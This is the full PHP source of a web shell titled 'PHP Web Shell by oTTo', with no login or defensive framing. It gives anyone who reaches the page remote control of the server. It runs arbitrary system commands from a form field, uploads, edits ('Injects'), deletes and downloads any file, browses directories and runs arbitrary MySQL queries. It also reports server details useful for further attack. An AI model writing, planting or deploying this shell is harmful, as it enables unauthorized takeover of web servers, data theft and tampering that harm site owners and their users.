<?php
/*--------------------------------------------
Codz By oTTo
version: V1
Last Modified :2013/11/2
----------------------------------------------
*/
//$downFile,$delFile,$refileName,$editFile
//Add "@" infront of $_POST['var'].If post no data ignore notice undefine index info.

$downFile = @$_GET["downFile"];
$delFile = @$_GET["delFile"];
$refileName = @$_GET["refileName"];
$editFile = @$_GET["editFile"];

//Download File
if (isset($downFile)) 
        {
        #@set_time_limit(600);  #Limits the maximum execution time
        $fileName = basename($downFile); //basename,filesize.readfile funtions use to read file.
        header("Content-Type: application/force-download; name=".$fileName); //Set http header info
        header("Content-Transfer-Encoding: binary");
        header("Content-Disposition: attachment; fileName=".$fileName);
        header("Expires: 0");
        header("Cache-Control: no-cache, must-revalidate");
        header("Pragma: no-cache");
      }
//Delete File
if(isset($delFile)&& $delFile!=""){    
        if(is_file($delFile)){     //Check if it is file type.
            $message = (@unlink($delFile)) //unlink funtion : Delete file if success return true else false.
              ? "<font color=blue>The deletion succeeds!'$delFile' Already deleted!</font>"
              : "<font color=blue>The deletion is defeated¡I'$delFile' The document exists!</font>" ;
        }else{
            $message = "<font color=blue>File '$delFile' does not exist¡I</font>";
        }
        echo $message;
      }

//Rename File
if (isset($refileName)){
  echo '<table>';
  echo '<form action="" method="post">';
  echo '<br>';
  echo '<tr>';
  echo '<td align="left">';
  echo '<font size="2">';
  echo 'Enter the newname to here:';
  echo '<input type="text" name="newname"/>';
  echo '<input type="submit" value="Rename"/>';
  echo '</tr></td></table>';
  $oldname=basename($refileName); //Get old Name
  if (@rename($oldname,$_POST['newname'])){
       echo '<script>alert(\'Rename Succeed!\')</script>';}
  else
    { if (!empty($_POST['newname']))
        echo '<script>alert(\'Rename Defeatedd!\')</script>';}
}
//Edit file
if (isset($editFile)) {
  $content=basename($editFile);
  if(empty($_POST['newcontent'])){ //No change or first time edit file.
    echo '<table><tr>';
    echo '<form action="" method="post">';
    echo '<input type="submit" value="Edition document"/>';
    echo '</tr>';    
    $fp=@fopen("$content","r");#fopen,fread,filesize,fclos,fwrite functions used to operate file.
    $data=@fread($fp,filesize($content));
    echo '<tr>';
    echo '<textarea name="newcontent" cols="80" rows="20" >';
    echo $data;
    @fclose($fp);
    echo '</textarea></tr></form></table>';
  }
   if (!empty($_POST['newcontent'])) //If file is not empty
    {
       $fp=@fopen("$content","w+");
       echo ($result=@fwrite($fp,$_POST['newcontent']))?"<font color=red>The injection document succeeds¡IGood Luck!</font>":"<font color=blue>The injection document is defeated¡I</font>"; 
       @fclose($fp);
    }
}

?>
<html>
	<head>
		<title>PHP Web Shell by oTTo</title>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8";>
		<style type="text/css">
		body {font-family: "sans-serif", "serif"; font-size: 12px;}
		BODY { background-color:#A2B5CD }
		a:link {color: #BFEFFF; text-decoration: none}
		a:visited {color: #080808; text-decoration: none}
		a:hover {color: #FFFFFF; text-decoration: underline}
		input {font-family: "sans-serif", "serif";font-size: 12px;}
		td {font-family: "sans-serif", "Verdana"; font-size: 12px;}
		.title {font-family: "Verdana", "Tahoma";font-size: 20px;font-weight: bold; color=black}
		</style>
	</head>
	<body>
		<table width="100%"  cellspacing="1" cellpadding="3">
			<tr>
				<td class="title" align="center">PHP Web Shell</td>
			</tr>
		</table>
		<hr>
		<table width="100%"  cellspacing="1" cellpadding="3">
			<tr>
				<td>Operating system:<?php echo PHP_OS;?></td>
				<td>Server name:<?php echo $_SERVER['SERVER_NAME'];?></td>
				<td>Server IP:<?php echo gethostbyname($_SERVER['SERVER_NAME']);?></td>
			</tr>
			<tr>
				<td>Server time:<?php echo date("y m d h:i:s",time());?></td>
				<td>Server port :<?php echo $_SERVER['SERVER_PORT'];?></td>
			</tr>
		</table>
		<hr>
		<table>
		
			<tr>
				<td><a href="?shell=env"> [Server Envirement] </a></td>
				<td><a href="?shell=checkdir"> [Brows Directory] </a></td>
				<td><a href="?shell=command"> [Command] </a></td>
				<td><a href="?shell=sql"> [Sql Operation] </a></td>
				<td><a href="?shell=change"> [Tramslate Encode] </a></td>
			</tr>
		</table>
		<hr>
		<table>
			<tr>
				<td>Home dir:
					<a href="?dir=<?php echo $_SERVER['DOCUMENT_ROOT'];?>">
					<?php echo $_SERVER['DOCUMENT_ROOT'];?></a>
				</td>
			</tr>
			<tr>
				<td>Current dir of contents:<?php
					$dir=@$_GET['dir'];
					if (!isset($dir) or empty($dir)) {
					  $dir=str_replace('\\','/',dirname(__FILE__));
					  echo "<font color=\"#00688B\">".$dir."</font>";
					} else {
					  
					  echo "<font color=\"#00688B\">".$dir."</font>";
					}
					?>
				</td>
			</tr>
			<tr>
				<td>
					<form enctype="multipart/form-data" action="" method="post">
					UploadFile:
					<input name="upload_file" type="file" style="font-family:Verdana,Arial; font-size: 9pt;">
					<input type="submit" value="Upload" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD">
					</form>
				</td>
			</tr>
			<?php

			//upload file
			$upload_file=@$_FILES['upload_file']['tmp_name'];
			$upload_file_name=@$_FILES['upload_file']['name'];
			$upload_file_size=@$_FILES['upload_file']['size'];

			if($upload_file){
				$file_size_max = 1000*1000;
				$store_dir = dirname(__FILE__);
				$accept_overwrite = 1;  //Check if upload switch.
				if($upload_file_size > $file_size_max){
					   echo "File is too large! <br>";
					   exit;
					}
				if(file_exists($store_dir ."\\". $upload_file_name) && !$accept_overwrite){
					   Echo "File is already exist!";
					   exit;
					}
				if(!move_uploaded_file($upload_file,$store_dir."\\".$upload_file_name)){
					   echo "Upload file defeated!";
					   exit;
					}



				echo "<p>Uploaded file:";
				echo "<font color=blue>".$_FILES['upload_file']['name']."</font>";
				echo "\t";

				echo "Uploadfilesiza:";
				echo "<font color=blue>".$_FILES['upload_file']['size']." Bytes</font>";
				echo "\t";

				Echo "Sucessful..."; 
			}
			?>
		</table>

		<table width="100%" border="0" cellspacing="1" cellpadding="3">
			<form action="" method="get">
				<tr>
					<td>
					The dir of contents glances over:
					<input type="text" name="dir" style="font-family:Verdana,Arial; font-size: 9pt;">
					<input type="submit" value="Goto" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD ">
					</td>
				</tr>
			</form>
		</table>
		<hr>
		<table width="100%" border="0" cellpadding="3" cellspacing="1">
		<tr>
		<td><b>Sub-Dir of contents</b></td>
		</tr>

		<?php
		$dirs=@opendir($dir);
		while ($file=@readdir($dirs)) { //Print sub dir and file.
		  $b="$dir/$file";
		  $a=@is_dir($b);
		  if($a=="1"){
			if($file!=".."&&$file!=".")  {
				 echo "<tr>\n";
				 echo "  <td><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">$file</a></td>\n";
				 echo "</tr>\n";
			} else {
				 if($file=="..")
				 echo "<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">Back to higher authority dir of contents</a>";
				}
			}
		}
		@closedir($dirs);
		?>
		</table>
		<hr>
		<table width="100%" border="0" cellpadding="3" cellspacing="1">
			<tr>
				<td><b>FileName</b></td>
				<td><b>FileDate</b></td>
				<td><b>FileSize</b></td>
				<td><b>FileOperations</b></td>
			</tr>

			<?php
			//Print all file
			$dirs=@opendir($dir);
			while ($file=@readdir($dirs)){
				$b="$dir/$file";
				$a=@is_dir($b);
				if($a=="0"){
					$size=@filesize("$dir/$file")/1024; 
					$lastsave=@date("Y-n-d H:i:s",filectime("$dir/$file"));
					echo "<tr>\n";
					echo "<td>$file</td>\n";
					echo "<td>$lastsave</td>\n";
					echo "<td>$size KB</td>\n";
					echo "<td><a href=\"?downFile=".urlencode($dir)."/".urlencode($file)."\"> [Down] </a>
							  <a href=\"?delFile=".urlencode($dir)."/".urlencode ($file)."\"> [Delete]</a>
							  <a href=\"?refileName=".urlencode($dir)."/".urlencode($file)."\"> [Rename] </a>
							  <a href=\"?editFile=".urlencode($dir)."/".urlencode($file)."\"> [Injects] </a></td>\n";
					echo "</tr>\n";
				}
			}
			@closedir($dirs);
			?>
		</table>
		<hr>

		<?php
		//Print envirement
		if (@$_GET['shell']=="env"){
			 function dir_wriable($dir){
				  $xY7_test=tempnam("$dir","test_file"); 
				  if ($fp=@fopen($xY7_test,"w")){
					   @fclose($fp);
					   @unlink($xY7_test);
					   $wriable="ture";
				   }
				   else {
						$wriable=false or die ("Cannot open $xY7_test!");
					}
				   return $wriable;
			  }
			 if (dir_wriable(str_replace('//','/',dirname(__FILE__)))){
					 $dir_wriable='Writable';
					 echo "<b>Current dir is writable</b>";
			  }
			  else{
					 $dir_wriable='not Writable';
					  echo "<b>Current dir is not writable</b>";
			   }

			   function getinfo($xy7)
			   {
					  if($xy7==1)
						 {
							$s='<font color=blue>YES<b>¡Ô</b></font>';
						  }
						 else
						   {
							 $s='<font color=red>NO<b>¡Ñ</b></font>';
							}
						 return $s;
						 } 
				 echo '<br><br>';
				 echo "Opearation system:" ;
				 echo PHP_OS;
				 echo '<br>'   ;
				 echo "Server Name:";
				 echo $_SERVER['SERVER_NAME'];
				 echo '<br>';
				 echo "Service port:";
				 echo $_SERVER['SERVER_PORT'];
				 echo '<br>';
				 echo "Server time:";
				 echo date("Y M D h:i:s",time());
				 echo '<br>';
				 echo "Server IP addr:";
				 echo gethostbyname($_SERVER['SERVER_NAME']);
				 echo '<br>';
				 echo "Server encode:";
				 echo $_SERVER['HTTP_ACCEPT_LANGUAGE'];
				 echo '<br>';
				 echo "Server engine:";
				 echo $_SERVER['SERVER_SOFTWARE'];
				 echo '<br>';
				 echo "PHP opearation:";
				 echo strtoupper(php_sapi_name());
				 echo '<br>';
				 echo "PHP version:";
				 echo PHP_VERSION;
				 echo '<br>';
				 echo "ZEND version:";
				 echo zend_version();
				 echo '<br>';
				 echo "File direct addr:";
				 echo __FILE__;
				 echo '<br>';
				 echo "Server empty size:";
				 echo intval(diskfreespace(".") / (1024 * 1024)).'MB';
				 echo '<br>';
				 echo "Memory limit:";
				 echo get_cfg_var("memory_limit");
				 echo '<br>';
				 echo "Upload file size limit:";
				 echo get_cfg_var("upload_max_filesize");
				 echo '<br>';
				 echo "Disable functions:";
				 echo get_cfg_var("disable_functions");
				 echo '<br>';
				 echo "Post max size:";
				 echo get_cfg_var("post_max_size");
				 echo '<br>';
				 echo "Max execution time:";
				 echo get_cfg_var("max_execution_time")."sec";
				 echo '<br>';
				 echo "Enable dl:";
				 echo getinfo(get_cfg_var("enable_dl"));
				 echo '<br>';
				 echo "register_globals:";
				 echo getinfo(get_cfg_var("register_globals"));
				 echo '<br>';
				 echo "Display errors:";
				 echo getinfo(get_cfg_var("display_errors"));
				 echo '<br>';
				 echo "PHP safe mode:";
				 echo getinfo(get_cfg_var("safe_mode"));
				 echo '<br>';
				 echo "FTP FTP support:";
				 echo getinfo(get_magic_quotes_gpc("FTP support"));
				 echo '<br>';
				 echo"Allow url fopen:";
				 echo getinfo(get_cfg_var("allow_url_fopen"));
				 echo '<br>';
				 echo "Session start:";
				 echo getinfo(function_exists("session_start"));
				 echo '<br>';
				 echo "Socket support:";
				 echo getinfo(function_exists("fsockopen"));
				 echo '<br>';
				 echo "MySQL DB:";
				 echo getinfo(function_exists("mysql_close"));
				 echo '<br>';
				 echo "SQL SERVER:";
				 echo getinfo(function_exists("mssql_close"));
				 echo '<br>';
				 echo "ODBC:";
				 echo getinfo(function_exists("odbc_close"));
				 echo '<br>';
				 echo "Oracle:";
				 echo getinfo(function_exists("ora_close"));
				 echo '<br>';
				 echo "SNMP:";
				 echo getinfo(function_exists("snmpget"));
				 echo '<br>';
				 echo '<br>';
		}
		elseif (@$_GET['shell']=="checkdir"){
		  global $PHP_SELF;
		  echo '<form action="" method="post">';
		  echo "Brows directory:";
		  echo '<input type="text" name="dir" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
		  echo '<input type="submit" value="GoTo" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
		  echo '<br>';
		  echo '<textarea name="textarea" cols="70" rows="15">';
		  if (empty($_POST['dir']))
			   $newdir="./";
		  else
			   $newdir=$_POST['dir'];
			   $handle=@opendir($newdir);
		  while ($file=@readdir($handle))
			{
			 echo ("$file \n");}
			 echo '</textarea></form>';
		}
		elseif (@$_GET['shell']=="command"){
		echo '<table>';
		echo '<form action="" method="post">';
		echo '<br>';
		echo '<tr>';
		echo '<td align="left">';
		echo 'Enter your command:';
		echo '<input type="text" name="cmd" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
		echo '<input type="submit" value="Run" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD"/>';
		echo '</tr>';echo '</td>';
		echo '<tr>';
		echo '<td>';
		echo '<textarea name="textarea" cols="70" rows="15" readonly>';
		  @system($_POST['cmd']);
		  echo '</textarea></form>';
		}

		elseif (@$_GET['shell']=="change"){
		echo '<form action="" method="post">';
		echo '<br>';
		echo "Enter binary character:";
		echo '<input type="text" name="char" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
		echo '<input type="submit" value="Transforms to Hexadecimal" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
		echo '</form>';
		echo '<textarea name="textarea" cols="40" rows="1" readonly>';
		$result=bin2hex(@$_POST['char']);
		  echo "0x".$result;
		  echo '</textarea>';
		}

		//mysql¾Þ§@
		elseif (@$_GET['shell']=="sql"){
		  echo '<table align="center" cellSpacing=8 cellPadding=4>';
		  echo '<tr><td>';
		  echo '<form action="" method="post">';
		  echo "Host:";
		  echo '<input name="servername" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
		  echo '</td><td>';
		  echo "Username:";
		  echo '<input name="username" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
		  echo '</td></tr>';
		  echo '<tr><td>';
		  echo "Password:";
		  echo '<input name="password" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
		  echo '</td><td>';
		  echo "DBname:";
		  echo '<input name="dbname" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
		  echo '</td></tr>';
		  $servername = @$_POST['servername'];
		  $username = @$_POST['username'];
		  $password = @$_POST['password'];
		  $dbname = @$_POST['dbname'];

		  if($link=@mysql_connect($servername,$username,$password) and @mysql_select_db($dbname)) {
				echo "<font color=blue>The database connects successfully!</font>";
				echo "<br>";
				$dbresult = @$_POST['query'];
				if(!empty($dbresult)){
					$dbresult = @mysql_query($dbresult);
					echo($dbresult) ? "<font color=blue>Execution successfully!</font>" : "<font color=blue>The request makes a mistake:</font> "."<font color=red>".mysql_error()."</font>";
					while($row_result = mysql_fetch_assoc($dbresult))
					{
						foreach($row_result as $item=>$value)
							echo "<br/>".$item."=".$value;
					}
					mysql_close();
				} 
		  }
		  else{
			  echo "<font color=red>".mysql_error()."</font>";
			  echo "<br>";
		  }
			  echo '<tr><td>';
			  echo '<textarea name="query" cols="60" rows="10">';
			  echo '</textarea>';
			  echo '</td></tr>';
			  echo '<tr><td align="center">';
			  echo '<input type="submit" value="Execution SQL_query" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
			  echo '</td></tr>';
			  echo '</table>';

		}
		?>
<table align="center"><tr><td>
<h6>Copyright (C) 2013 All Rights Reserved
</td></tr></table>
</body>
</html>